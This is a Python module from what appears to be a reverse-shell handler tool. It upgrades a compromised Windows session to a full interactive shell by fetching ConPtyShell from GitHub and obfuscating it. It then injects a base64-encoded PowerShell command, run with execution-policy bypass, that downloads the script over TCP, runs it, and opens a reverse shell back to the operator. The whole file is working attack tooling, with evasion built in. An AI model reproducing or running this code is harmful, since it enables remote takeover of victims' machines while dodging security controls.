from __future__ import annotations

import base64
import shutil
import threading
import time
from typing import Callable, Dict, Optional

from koi.session import Session
from koi.utils.cache import cache_path, fetch_or_cache
from koi.utils.ps_obfuscate import obfuscate_conptyshell
from koi.utils.tcp import get_local_ip, spawn_send_server
from koi.utils.ui import Spinner, notify, bold, accent

_CONPTYSHELL_URL = (
    "https://raw.githubusercontent.com/antonioCoco/ConPtyShell"
    "/master/Invoke-ConPtyShell.ps1"
)

_TCP_SERVER_TIMEOUT = 60.0
_CONPTY_WAIT_TIMEOUT = 30.0
_CONPTY_INIT_SLEEP = 0.3
_CONPTY_POLL_SLEEP = 0.1


def _build_invoke_cmd(
    local_ip: str, tcp_port: int, callback_port: int, rows: int, cols: int, conpty_fn: str
) -> str:
    inner = (
        f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{tcp_port});"
        f"$_s=$_c.GetStream();"
        f"$_r=New-Object IO.StreamReader($_s);"
        f"$_script=$_r.ReadToEnd();"
        f"$_c.Close();"
        f". ([scriptblock]::Create($_script));"
        f"{conpty_fn} -RemoteIp {local_ip} -RemotePort {callback_port}"
        f" -Rows {rows} -Cols {cols} -CommandLine powershell"
    )
    encoded = base64.b64encode(inner.encode("utf-16-le")).decode()
    return f"powershell -nop -ep bypass -enc {encoded}"


_CONPTY_CACHE_NAME = "Invoke-ConPtyShell.ps1"


def upgrade_windows_conptyshell(
    sess: Session,
    sessions: Dict[int, Session],
    port: int,
    pending_conpty: dict,
    conpty_staging: dict,
    conpty_lock: threading.Lock,
    mask_ip: Callable[[str, str], str],
    logger=None,
) -> None:
    try:
        cols, rows = shutil.get_terminal_size()
    except Exception:
        cols, rows = 80, 24

    local_ip = sess.conn.getsockname()[0]
    if local_ip in ("0.0.0.0", ""):
        local_ip = get_local_ip(sess.addr[0])

    with Spinner("Fetching ConPtyShell..."):
        try:
            ps1_data, source = fetch_or_cache(_CONPTYSHELL_URL, _CONPTY_CACHE_NAME)
        except Exception as exc:
            notify('error', f"Failed to fetch ConPtyShell: {exc}")
            return

    if source == "cache":
        notify('warning', f"Network unavailable, using cached ConPtyShell ({cache_path(_CONPTY_CACHE_NAME)})")
    else:
        notify('info', "ConPtyShell fetched from remote")

    try:
        ps1_data, conpty_fn = obfuscate_conptyshell(ps1_data)
    except ValueError as exc:
        notify('error', f"Cannot prepare ConPtyShell: {exc}")
        return

    tcp_port, thread, errors = spawn_send_server(
        ps1_data, timeout=_TCP_SERVER_TIMEOUT, expected_ip=sess.addr[0]
    )
    notify('info', f"Serving ConPtyShell on TCP port {bold(tcp_port)}")

    invoke_cmd = _build_invoke_cmd(local_ip, tcp_port, port, rows, cols, conpty_fn)

    notify('info',
        f"Invoking ConPtyShell on session {accent(f'#{sess.id}')}, callback {bold(mask_ip(local_ip, 'local'))}:{bold(port)}"
    )

    if logger:
        logger.log_event("upgrade_start")

    pending_conpty[sess.addr[0]] = (sess.os_type, time.monotonic() + _CONPTY_WAIT_TIMEOUT)
    if not sess.send((invoke_cmd + "\r\n").encode(sess.encoding, errors="replace")):
        pending_conpty.pop(sess.addr[0], None)
        notify('error', f"Session {accent(f'#{sess.id}')} died before ConPtyShell could be invoked.")
        return

    new_sess = None
    try:
        with Spinner("Waiting for ConPtyShell connection..."):
            new_sess = _wait_for_new_session(
                conpty_staging=conpty_staging,
                conpty_lock=conpty_lock,
                expected_ip=sess.addr[0],
                timeout=_CONPTY_WAIT_TIMEOUT,
            )
    finally:
        pending_conpty.pop(sess.addr[0], None)
        with conpty_lock:
            stale = conpty_staging.pop(sess.addr[0], None)
        if stale is not None and stale is not new_sess:
            stale.close()

    if new_sess is None:
        detail = f" ({errors[0]})" if errors else ""
        notify('error', f"ConPtyShell did not connect back in time.{detail}")
        return

    old_id = sess.id
    new_sess.id = old_id
    new_sess.tag = sess.tag
    new_sess.connected_at = sess.connected_at
    new_sess.log_path = sess.log_path
    sess.close()
    sessions.pop(old_id, None)
    sessions[old_id] = new_sess

    new_sess.upgraded = True
    new_sess.is_conptyshell = True
    if logger:
        logger.log_event("upgrade_done")
        new_sess.attach_logger(logger)
    time.sleep(_CONPTY_INIT_SLEEP)
    new_sess.conn.sendall(b"\r\n")
    notify('success', f"Session {accent(f'#{old_id}')} upgraded to ConPtyShell.")


def _wait_for_new_session(
    conpty_staging: dict,
    conpty_lock: threading.Lock,
    expected_ip: str,
    timeout: float = 30.0,
) -> Optional[Session]:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        time.sleep(_CONPTY_POLL_SLEEP)
        with conpty_lock:
            if expected_ip in conpty_staging:
                return conpty_staging.pop(expected_ip)
    return None


def get_external_resources() -> list[dict]:
    return [
        {
            "name": "ConPtyShell",
            "url": _CONPTYSHELL_URL,
            "cache_key": _CONPTY_CACHE_NAME,
        },
    ]